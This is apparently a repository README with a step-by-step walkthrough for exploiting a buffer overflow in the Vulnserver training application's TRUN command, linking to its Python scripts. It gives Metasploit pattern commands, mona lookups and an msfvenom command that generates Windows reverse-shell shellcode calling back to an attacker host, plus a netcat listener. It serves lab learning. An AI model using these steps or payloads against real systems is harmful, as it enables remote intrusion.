# Buffer Overflow Exploit Walkthrough - Vulnserver (TRUN)

This repository contains a step-by-step guide and Python scripts to exploit a buffer overflow vulnerability in Vulnserver (`vulnserver.exe`) via the `TRUN` command.

## 📋 Prerequisites

- **Vulnerable Application**: [Vulnserver](https://github.com/stephenbradshaw/vulnserver)
- **Debugger**: [Immunity Debugger](https://github.com/kbandla/ImmunityDebugger/releases)
- **Python 3**
- **Kali Linux** (for pattern generation and shellcode creation)

## 🚀 Setup Before Each Step

Before starting any exploitation step (and after each crash), you must:

1. Restart `vulnserver.exe`.
2. Run **Immunity Debugger as Administrator**.
3. Attach the vulnerable process in Immunity via:  
   `File → Attach → vulnserver.exe`.
4. Click the **Play (▶)** button to start execution.

---

## 🔍 Step 1 — Fuzzing

Fuzzing sends increasingly large data to the vulnerable program to trigger a crash and determine if a buffer overflow is possible.

**Target**: Vulnserver on port 9999 using the `TRUN` command.

**Script**: [Fuzzing.py](https://github.com/itsK1M0/Buffer-Overflow/blob/main/Fuzzing.py)

The script sends an initial buffer of 100 `A` characters, then increments the size in a loop until Vulnserver crashes.

> 💡 The crash indicates the buffer is overflowed and **EIP overwrite** is likely.

---

## 🧮 Step 2 — Finding the Offset

Once we know the crash occurs before 2700 bytes (we use 3000 for safety), we find the **exact offset** where EIP is overwritten.

**Tools** (from Metasploit on Kali):
- `pattern_create.rb`
- `pattern_offset.rb`

Located in:  
`/usr/share/metasploit-framework/tools/exploit/`

### Generate unique pattern:
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
```

### Use in script:
[find_offset.py](https://github.com/itsK1M0/Buffer-Overflow/blob/main/find_offset.py)

After sending the pattern, note the **EIP value** (e.g., `386F4337`).

### Find offset:
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 386F4337 -l 3000
```

> ✅ Result: **2003 bytes** to reach EIP.

---

## 🎯 Step 3 — Overwriting EIP

We verify control over EIP by sending:
- 2003 `A` characters (padding)
- 4 `B` characters (to overwrite EIP)

**Script**: [crush_EIP.py](https://github.com/itsK1M0/Buffer-Overflow/blob/main/crush_EIP.py)

After execution, EIP should be `42424242` (`B` = `0x42`), confirming full control.

---

## 🚫 Step 4 — Finding Bad Characters

Some bytes can break shellcode execution. We test all hex bytes from `\x01` to `\xFF` (null byte `\x00` is always bad).

**Script**: [find_badchars.py](https://github.com/itsK1M0/Buffer-Overflow/blob/main/find_badchars.py)

### Method:
1. Send payload with all bytes.
2. After crash, in Immunity:  
   Right-click **ESP → Follow in Dump**.
3. Check if bytes appear in order (`01 02 03 ... FF`).
4. Identify missing/altered bytes.

> If sequence is intact: no bad chars (except `\x00`).

---

## 📦 Step 5 — Finding a Reliable Module

We need a module without memory protections (DEP, ASLR, SafeSEH) to place a `JMP ESP` instruction.

### Install Mona in Immunity:
Download [mona.py](https://github.com/corelan/mona/blob/master/mona.py) and place in:  
`C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands\`

### 1. List modules:
In Immunity command bar:
```
!mona modules
```
Look for a module with all protections `False`.  
Here: **essfunc.dll** is suitable.

### 2. Find JMP ESP opcode:
Using `nasm_shell`:
```
jmp esp
```
Opcode = `FF E4`

### 3. Find JMP ESP address in module:
```
!mona find -s "\xff\xe4" -m essfunc.dll
```
Example address: `625011AF`

### 4. Convert to Little Endian for x86:
`625011AF` → `\xAF\x11\x50\x62`

### 5. Test return address:
**Script**: [Return_address.py](https://github.com/itsK1M0/Buffer-Overflow/blob/main/Return_address.py)

Replace 4 `B` with the Little Endian address.

In Immunity:
- Go to address `625011AF`.
- Press `F2` to set a breakpoint.
- Run script → breakpoint should hit, confirming valid address.

---

## 🐚 Step 6 — Generating Shellcode

With a valid `JMP ESP` return address, generate reverse shell shellcode using `msfvenom`.

### Command:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00"
```

### Options explained:
- `-p windows/shell_reverse_tcp`: Windows reverse TCP payload.
- `LHOST`: Attacker's IP (Kali).
- `LPORT`: Listening port on attacker.
- `EXITFUNC=thread`: Improves stability.
- `-f c`: Output in C format for Python.
- `-a x86`: Target architecture.
- `--platform windows`: Target OS.
- `-b "\x00"`: Exclude bad chars (only null byte here).

### Final exploit script:
[shell.py](https://github.com/itsK1M0/Buffer-Overflow/blob/main/shell.py)

Structure:
```
[ TRUN ][ 2003 A's ][ JMP ESP address ][ NOP sled ][ Shellcode ][ padding ]
```

---

## ✅ Final Validation

1. Start netcat listener on Kali:
   ```bash
   nc -lvnp 4444
   ```
2. Run `shell.py`.
3. If successful, you'll get a reverse shell on the target machine.

---

## 📁 Scripts Overview

- [Fuzzing.py](https://github.com/itsK1M0/Buffer-Overflow/blob/main/Fuzzing.py) – Step 1
- [find_offset.py](https://github.com/itsK1M0/Buffer-Overflow/blob/main/find_offset.py) – Step 2
- [crush_EIP.py](https://github.com/itsK1M0/Buffer-Overflow/blob/main/crush_EIP.py) – Step 3
- [find_badchars.py](https://github.com/itsK1M0/Buffer-Overflow/blob/main/find_badchars.py) – Step 4
- [Return_address.py](https://github.com/itsK1M0/Buffer-Overflow/blob/main/Return_address.py) – Step 5
- [shell.py](https://github.com/itsK1M0/Buffer-Overflow/blob/main/shell.py) – Step 6

---

## ⚠️ Disclaimer

This documentation is for **educational and authorized testing purposes only**. Do not use on systems you do not own or have explicit permission to test.

---

## 📚 References

- [Vulnserver GitHub](https://github.com/stephenbradshaw/vulnserver)
- [Immunity Debugger](https://www.immunityinc.com/products/debugger/)
- [Mona Py](https://github.com/corelan/mona)
- [Metasploit](https://www.metasploit.com/)
